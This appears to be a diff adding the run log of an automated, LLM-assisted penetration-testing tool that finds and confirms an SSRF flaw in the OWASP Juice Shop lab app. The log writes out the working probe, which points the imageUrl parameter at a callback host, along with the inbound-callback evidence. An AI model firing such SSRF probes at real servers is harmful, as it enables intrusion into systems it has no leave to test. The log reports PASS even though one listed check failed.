@@ -1,0 +1,62 @@
+16:19:24 clinkz.discovery.js_source_ingest INFO  js source ingest: 199 files → 151 entrypoints, 1 call-sites, 0 guards; manifest=express@4.21.0 declared in package.json — carrying dependency of the surfaced capability
+16:19:24 clinkz.discovery.engine    INFO  discovery: 1 active primitives, 1 Δ, 1 reachability edges, 0 recalls, 1 hypotheses
+16:19:24 clinkz.oob.collaborator    INFO  OOB collaborator started: zone=host.docker.internal:18081 shape=path http=0.0.0.0:18081 dns=0.0.0.0:15354
+16:19:24 clinkz.oob.collaborator    INFO  OOB collaborator health-check: http=True dns=True recorded=['dns', 'http'] → healthy=True
+16:19:24 clinkz.llm.factory         INFO  Initializing LLM client: provider=anthropic agent_role=-
+16:19:25 clinkz.llm.fallback.ResilientLLMClient INFO  ResilientLLMClient initialised — role=exploit profile=reasoning chain=['anthropic']
+16:19:50 clinkz.agents.base.ReportAgent INFO  ReportAgent starting (simple mode) for 'A2b Juice Shop SSRF discovery' (cfc21060-6518-4446-9578-b3ff55cb9065)
+16:19:50 clinkz.agents.base.ReportAgent INFO  Loaded 1 findings, 0 targets
+16:19:50 clinkz.agents.base.ReportAgent INFO  JSON report written to outputs\cfc21060-6518-4446-9578-b3ff55cb9065\report_cfc21060-6518-4446-9578-b3ff55cb9065.json
+16:19:50 clinkz.agents.base.ReportAgent INFO  Markdown report written to outputs\cfc21060-6518-4446-9578-b3ff55cb9065\report_cfc21060-6518-4446-9578-b3ff55cb9065.md
+16:19:50 clinkz.agents.base.ReportAgent INFO  Report complete: 1 findings, risk_rating=High
+16:19:50 clinkz.oob.collaborator    INFO  OOB collaborator stopped and event log cleared
+
+==============================================================================
+PRE-FLIGHT (keys + Juice Shop + source→hypothesis + collaborator)
+==============================================================================
+SOURCE→HYPOTHESIS (the JS-source path):
+  sink: fetch(imageUrl) @ profileImageUrlUpload.ts:24
+  sink_shape_id: js.http_egress  primitive: egress_fetch
+  hypothesis: POST http://localhost:3000/profile/image/url  param=['imageUrl'] loc={'imageUrl': 'form_body'}  test=_test_ssrf
+OOB collaborator healthy: zone=host.docker.internal:18081 http_port=18081 dns_port=15354
+authenticated Juice Shop user (JWT acquired, 756 chars)
+
+==============================================================================
+FULL _test_ssrf METHODOLOGY (live Anthropic LLM + collaborator)
+==============================================================================
+  _test_ssrf emitted 0 finding(s):
+
+==============================================================================
+P6 CONFIRM — point the discovered SSRF param at the collaborator
+==============================================================================
+  confirmed_out_of_band=True  note=out-of-band callback bearing the probe nonce received (http from 127.0.0.1)
+  RAW-AUDITABLE P6 evidence pair:
+    outbound_probe    : POST http://localhost:3000/profile/image/url — imageUrl=http://host.docker.internal:18081/bryu2wjujlcecg22ihulf4nrr4
+    callback_nonce    : bryu2wjujlcecg22ihulf4nrr4
+    inbound_callback  : inbound callback: proto=http src=127.0.0.1 host=host.docker.internal:18081 path=/bryu2wjujlcecg22ihulf4nrr4 received_at=1784717365.831
+    control           : fresh single-use nonce minted but never sent to the target — the collaborator re…
+    control_bore_nonce: False (must be False)
+
+==============================================================================
+ZERO-FP — same probe with auth stripped (SSRF gate blocks) → no callback
+==============================================================================
+  control confirmed_out_of_band=False (expect False)  note=blind_unconfirmed (egress may be filtered) — no callback within the window
+
+==============================================================================
+REPORT + TRACE (raw artifact paths)
+==============================================================================
+engagement_id : cfc21060-6518-4446-9578-b3ff55cb9065
+report (json) : outputs\cfc21060-6518-4446-9578-b3ff55cb9065\report_cfc21060-6518-4446-9578-b3ff55cb9065.json
+report (md)   : outputs\cfc21060-6518-4446-9578-b3ff55cb9065\report_cfc21060-6518-4446-9578-b3ff55cb9065.md
+trace (jsonl) : C:\Users\ptkva\OneDrive\Documents\clinkz\outputs\cfc21060-6518-4446-9578-b3ff55cb9065\trace.jsonl
+
+==============================================================================
+VERDICT — JS-source generalization on a live, different-language target
+==============================================================================
+  JS ingestor surfaced the own-code SSRF sink (cross-file)   : True
+  engine hypothesized EGRESS_FETCH from JS source            : True
+  full _test_ssrf methodology confirmed (live LLM)           : False
+  P6 confirm via callback (raw-auditable)                    : True
+  zero-FP (auth stripped → SSRF gate blocks → no callback)   : True
+
+  RESULT: PASS
